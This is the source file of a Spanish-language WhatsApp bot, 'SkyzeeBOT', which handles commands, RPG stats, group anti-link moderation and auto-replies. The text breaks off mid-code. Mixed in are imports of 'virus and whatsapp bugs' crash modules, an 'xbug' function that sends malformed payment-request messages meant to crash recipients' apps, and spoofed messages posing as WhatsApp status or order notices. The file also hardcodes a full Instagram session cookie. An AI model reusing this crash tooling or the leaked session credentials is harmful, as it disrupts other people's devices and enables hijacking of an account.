require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, Mimetype, generateWAMessage, prepareWAMessageMedia, prepareMessageFromContent,  areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const yts = require('youtube-yts')
const xfar = require('xfarr-api')
const request = require('request')
const xeontod = require("tod-api")
const { EmojiAPI } = require("emoji-api")
const { msgFilter } = require('./lib/antispam')
const emoji = new EmojiAPI()
const thiccysapi = require('textmaker-thiccy')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
const { buffergif } = require('./lib/myfunc2')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { jadibot, listJadibot } = require('./lib/rentbot')
const { performance } = require('perf_hooks')
const { igApi, getSessionId } = require('insta-fetcher');
let ig = new igApi("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
ig.setCookie("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { fetchBuffer } = require("./lib/myfunc2")
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require("./lib/lvlfunction");
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('./storage/user/darah.js')
const { cekInventoryAdaAtauGak, addInventori,  addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi,getEmas,getEmerald,getUmpan,getPotion } = require('./storage/user/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('./storage/user/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit } = require('./storage/user/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi, kurangGajah, getIkan, getAyam, getKelinci, getDomba, getSapi, getGajah } = require('./storage/user/buruan.js')
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'
const { menu, menu2 } = require('./src/texts/menu.js')

const time = moment.tz('America/Argentina/Buenos_Aires').format('HH:mm:ss')
const date = moment.tz('America/Argentina/Buenos_Aires').format('DD/MM/YYYY')
const time2 = moment().tz('America/Argentina/Buenos_Aires').format('HH:mm:ss')  
if (time2 > "20:00:00") { var ucapanWaktu = `Buenas noches! 🌌` }
else if (time2 > "12:00:00") { var ucapanWaktu = `Buenas tardes! 🌅` }
else if (time2 > "06:00:00") { var ucapanWaktu = `Buenos días! 🌄` }
else if (time2 > "00:00:00") { var ucapanWaktu = `Buenas noches! 🌌` }
 
// read database game
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.math = []
let vote = db.data.others.vote = []

//read database jid
let premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
// let banned = JSON.parse(fs.readFileSync('./database/user/banned.json'));
// let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
// let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
// let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
// let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
// let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
// let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
// let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
// let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
// let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
// let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
// let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
// let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
// let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
// let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
// let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'));
// let autorep =JSON.parse(fs.readFileSync('./database/autoreply.json'));

//database virus and whatsapp bugs
//warrrrrrrrr
const { xeonvirtex } = require('./XBug/xeonvirtex')
const { xeonbutton } = require('./XBug/xeonbutton')
const { xeonbrutal } = require('./XBug/xeonbrutal')
const { iphone } = require('./XBug/virtex/iphone')
const { iphone5 } = require('./XBug/virtex/iphone5')
const { xeonbutton2 } = require('./XBug/virtex/xeonbutton2')
const { bugsw } = require('./XBug/virtex/bugsw')
const xpicvirus = fs.readFileSync(`./XBug/xpicvirus.png`)
//warrrrrrrrrr

//══════════[ FUNCIÓN RPG ]══════════\\
let DarahAwal =  global.rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const ikan = ['🐟','🐠','🐡']
//══════════[ !FUNCIÓN RPG ]══════════\\

//database auto reply
let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));

module.exports = SkyzeeBOT = async (SkyzeeBOT, m, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = /[!.#/]/.test(body) ? body.match(/[!.#/]/)[0] : "#"
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await SkyzeeBOT.decodeJid(SkyzeeBOT.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const type = Object.keys(mek.message)[0]  
var from = mek.key.remoteJid      
const content = JSON.stringify(mek.message)

	    const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}
	
	         //media detect \\
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
     
        //hijack function
        const ordermessage = (m.msg.xtype === 'conversation' && m.msg.message.conversation) ? m.msg.message.conversation : (m.msg.xtype == 'imageMessage') && m.msg.message.imageMessage.caption ? m.msg.message.imageMessage.caption : (m.msg.xtype == 'videoMessage') && m.msg.message.videoMessage.caption ? m.msg.message.videoMessage.caption : (m.msg.xtype == 'extendedTextMessage') && m.msg.message.extendedTextMessage.text.startsWith(prefix) ? m.msg.message.extendedTextMessage.text : (m.msg.xtype == 'buttonsResponseMessage') && m.msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? m.msg.message.buttonsResponseMessage.selectedButtonId : (m.msg.xtype == 'listResponseMessage') && m.msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? m.msg.message.listResponseMessage.singleSelectReply.selectedRowId : (m.msg.xtype == 'templateButtonReplyMessage') && m.msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? m.msg.message.templateButtonReplyMessage.selectedId : ''   
        const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
	 
	
	    //Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": log0,"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
		
	
// Group
        const groupMetadata = m.isGroup ? await SkyzeeBOT.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
	    // const isBan = banned.includes(m.sender)
        const isPremium = premium.includes(m.sender)

        const isantiwagc = m.isGroup ? antiwagc.includes(from) : false
        const isantiwapc = m.isGroup ? antiwapc.includes(from) : false
        const isantiyt = m.isGroup ? antiyt.includes(from) : false
        const isantiig = m.isGroup ? antiig.includes(from) : false
        const isantifb = m.isGroup ? antifb.includes(from) : false
        const isantitg = m.isGroup ? antitg.includes(from) : false
        const isantitt = m.isGroup ? antitt.includes(from) : false
        const isantitwt = m.isGroup ? antitwt.includes(from) : false
        const isantidocs = m.isGroup ? antidocs.includes(from) : false
        const isantitoxic = m.isGroup ? antitoxic.includes(from) : false
        const isantiflood = m.isGroup ? antiflood.includes(from) : false
        const isantilinks = m.isGroup ? antilinks.includes(from) : false
        const isautosticker = m.isGroup ? autosticker.includes(from) : false
        const isautoreply = m.isGroup ? autoreply.includes(from) : false
        const isxplevel = m.isGroup ? xplevel.includes(from) : false
        const isnsfw = m.isGroup ? nsfw.includes(from) : false
        const notButtons = true
		const isgroupban = bannedGroup.includes(from)
		const isuserban = bannedUser.includes(m.sender)
        const solot = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]

		const replySuccess = (teks) => {
           SkyzeeBOT.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${command}`,"body": `${botname}`, "previewType": "PHOTO","thumbnailUrl": `./XeonMedia/theme/success.jpg`,"thumbnail": fs.readFileSync(`./XeonMedia/theme/success.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        const replyNone = (teks) => {
            SkyzeeBOT.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${command}`,"body": `${botname}`, "previewType": "PHOTO","thumbnailUrl": `./XeonMedia/theme/none.png`,"thumbnail": fs.readFileSync(`./XeonMedia/theme/none.png`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        const replyWarn = (teks) => {
            SkyzeeBOT.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${command}`,"body": `${botname}`, "previewType": "PHOTO","thumbnailUrl": `./XeonMedia/theme/warn.jpg`,"thumbnail": fs.readFileSync(`./XeonMedia/theme/warn.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        const replyWarnAuto = (teks) => {
            SkyzeeBOT.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `🔐 𝙶𝚁𝚄𝙿𝙾 𝙿𝚁𝙾𝚃𝙴𝙶𝙸𝙳𝙾 𝙿𝙾𝚁 ${botname} 🔐`,"body": `ANTILINK`, "previewType": "PHOTO","thumbnailUrl": `./XeonMedia/theme/warn.jpg`,"thumbnail": fs.readFileSync(`./XeonMedia/theme/warn.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        const replyErr = (teks) => {
            SkyzeeBOT.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `VUELVE A INTENTARLO`,"body": `${botname}`, "previewType": "PHOTO","thumbnailUrl": `./XeonMedia/theme/error.png`,"thumbnail": fs.readFileSync(`./XeonMedia/theme/error.png`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        const replyLogo = (teks, title) => {
            SkyzeeBOT.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${title}`,"body": `${botname}`, "previewType": "PHOTO","thumbnailUrl": `./XeonMedia/theme/skyzee.png`,"thumbnail": fs.readFileSync(`./XeonMedia/theme/skyzee.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        const replytag = (teks, pic) => {
            var groupe = SkyzeeBOT.groupMetadata(from)
            var members = groupe['participants']
            var mems = []
            SkyzeeBOT.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/${pic}.jpg`),"sourceUrl": `${linkz}`}}, mentionedJid : mems }, { quoted: m})
        }

// database: users
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object' && isCmd) global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else if (!user && isCmd) {
				replyLogo(`*¡Bienvenido al SkyzeeBOT!*\n\nSi no puedes ver los mensajes del bot debe ser a que tu dispositivo no soporte el _template buttons_, deshabilítalo con "${prefix}notbuttons on" y vuelve a intentarlo. Para conocer los comandos del bot, utiliza "${prefix}menu" :)`, 'NUEVO USUARIO DETECTADO')
            	global.db.data.users[m.sender] = {
	        		afkTime: -1,
	        		afkReason: '',
	        		limit: limitUser,
	        	}
			}
            
    let chats = global.db.data.chats[m.chat]
    if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
    if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
    } else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
    }
    
    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    

//function leveling & pick
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}


function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const hsjdh = randomNomor(5)

//auto recording all
    if (global.autoRecord) { if (m.chat) { SkyzeeBOT.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { SkyzeeBOT.sendPresenceUpdate('composing', m.chat) }
}

// total hit
        global.hit = {}
        let mention = [`${ownernomer}@s.whatsapp.net`]
        if (!(budy.includes('https://'))) {
        let isMention = (m.mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.contextInfo.participant : ''
if (isCmd) {
	console.log(chalk.black(chalk.bgRed('[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)) + '\n ' + chalk.white(chalk.bgBlue(budy || m.mtype)) + '\n  ' + chalk.magenta('=> From'), chalk.yellow(pushname, m.sender) + '\n   ' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
	SkyzeeBOT.sendMessage(m.chat, {
        react: {
        	text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
            key: m.key,
        }
    })
	data = await fetchJson('https://api.countapi.xyz/hit/SkyzeeBOT-md/visits')
	hitsCmd = `${data.value}`
	dataa = await fetchJson(`https://api.countapi.xyz/hit/SkyzeeBOT-md${moment.tz('America/Argentina/Buenos_Aires').format('DDMMYYYY')}/visits`)
	todayHitsCmd = `${dataa.value}`
} else if (budy.includes('bot' || 'alezuu' || 'skyzee')) {
            console.log(chalk.black(chalk.bgMagenta('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)) + '\n ' + chalk.white(chalk.bgBlue(budy || m.mtype)) + '\n  ' + chalk.magenta('=> From'), chalk.yellow(pushname, m.sender) + '\n   ' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else if (budy.includes(global.ownernomer || global.owner) || isMention.includes(mention)) {
            console.log(chalk.black(chalk.bgMagenta('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)) + '\n ' + chalk.white(chalk.bgBlue(budy || m.mtype)) + '\n  ' + chalk.magenta('=> From'), chalk.yellow(pushname, m.sender) + '\n   ' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else if (m.message) {
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)) + '\n ' + chalk.white(chalk.bgBlue(budy || m.mtype)) + '\n  ' + chalk.magenta('=> From'), chalk.yellow(pushname, m.sender) + '\n   ' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        }
}

//premium
const prem1 = `Hi bro  ${pushname} ${ucapanWaktu} \n\nThis feature is for premium members only, please buy premium to use this feature`
const prem2 = `Click the button below to buy premium`
const prem3 = [{buttonId: `${prefix}buypreim`,buttonText: {displayText: `BUY PREMIUM`,},type: 1,},]
blomdaftar = `${ucapanWaktu} @${sender.split("@")[0]} Kamu belum terdaftar di database cek private message mu untuk mendaftar`
limitabis = `*[YOUR LIMIT IS EXPIRED]*\nBuy limit in ${prefix}buylimit or buy premium to get unlimited limit`

//WARRRRRRR
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
const xbug = (teks) => {
  SkyzeeBOT.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//-------------------End--------------------\\
//Dont edit ot recode or bug wont work

const fmedia =  {
  key : {
    fromMe: false,
participant : '0@s.whatsapp.net'
},
     contextInfo: {
    forwardingScore: 9999,
    isForwarded: false, //:'v
showAdAttribution: true,
title: botname,
mediaType: "VIDEO",
mediaUrl: websitex,
previewType: "PHOTO",
thumbnail: thumb,
sourceUrl: "",
detectLinks: false,
    }}


	//group target \\

	//button
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const butonna = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
SkyzeeBOT.sendMessage(id, butonna, options)
}
const http = randomNomor(500)

//document
const kontol = {
	key : {
   participant : '0@s.whatsapp.net'
},
       message: {
    documentMessage: {
    title: `${pushname}`, 
    jpegThumbnail: thumb
  }
}
      }
sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, buttons, boddy, thumbnail, thumbnailUrl, sourceUrl, mediaUrl, options) => {
let buttonMessage = {
  document: doc,
  mimetype: "application/pdf",
  fileName: fileName,
  fileLength: fileLength,
  caption: caption,
  footer: footer,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
     title: time,
     body: boddy,
     thumbnail: thumbnail,
     thumbnailUrl: thumbnailUrl,
     sourceUrl: sourceUrl,
     mediaUrl: mediaUrl,  
     renderLargerThumbnail: true,
     showAdAttribution: true,
     mediaType: 1
   }}
       }
   SkyzeeBOT.sendMessage(m.chat, buttonMessage, options)
   }
                
    //══════════[ AUTO ]══════════//
        function action(kice) {
            if (m.key.fromMe) return
            if (isAdmins || isCreator) return replyWarnAuto(`👁❕`)
            replyWarnAuto(`👁❗`)
            SkyzeeBOT.groupParticipantsUpdate(m.chat, [kice], 'remove')
            SkyzeeBOT.sendMessage(m.chat, { text: `🔐 𝙶𝚁𝚄𝙿𝙾 𝙿𝚁𝙾𝚃𝙴𝙶𝙸𝙳𝙾 𝙿𝙾𝚁 ${botname} 🔐` })
        }
        if (isantiwagc) {
            linkgce = await SkyzeeBOT.groupInviteCode(from)
            if (budy.includes(`chat.whatsapp.com/${linkgce}`)) action(m.sender)
        }
        if (isantiwapc) {
            if (budy.includes(`wa.me/`)) action(m.sender)
        }
        if (isantiyt) {
            if (budy.includes("youtu.be/" || "youtube.com/")) action(m.sender)
        }
        if (isantiig) {
            if (budy.includes("instagram.com/")) action(m.sender)
        }
        if (isantifb) {
            if (budy.includes("facebook.com/")) action(m.sender)
        }
        if (isantitg) {
            if (budy.includes("t.me/")) action(m.sender)
        }
        if (isantitt) {
            if (budy.includes("tiktok.com/")) action(m.sender)
        }
        if (isantitwt) {
            if (budy.includes("twitter.com/")) action(m.sender)
        }
        if (isantidocs) {

        }
        if (isantitoxic) {
            if (bad.includes(messagesD)) action(m.sender)
        }
        if (isantiflood) {
            if (m.message && msgFilter.isFiltered(m.sender)) {
                msgFilter.addAmount()
                if (msgFilter.amount() >= 3) action(m.sender)
            } else {
                msgFilter.addFilter(m.sender)
                msgFilter.addAmount()
            }
        }
        if (isantilinks) {
            if (isUrl(m.text)) action(m.sender)
        }
        if (isautoreply) {
            for (let anji of xeonysticker) {
                if (budy === anji) {
                    result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
				    SkyzeeBOT.sendMessage(m.chat, { sticker: result }, { quoted: m })
				}
			}
    		for (let anju of xeonyaudio) {
    			if (budy === anju) {
					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
					SkyzeeBOT.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
				}
			}
            for (let anjuu of xeonyaudio2) {
                if (budy.startsWith(anjuu)) {
                    result = fs.readFileSync(`./XeonMedia/audio/startswith/${anjuu}.mp3`)
                    SkyzeeBOT.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
                }
            }
